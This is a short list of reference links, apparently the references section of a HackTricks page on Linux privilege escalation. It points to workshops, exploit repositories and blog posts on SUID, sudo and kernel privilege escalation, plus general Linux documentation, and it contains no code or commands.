- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
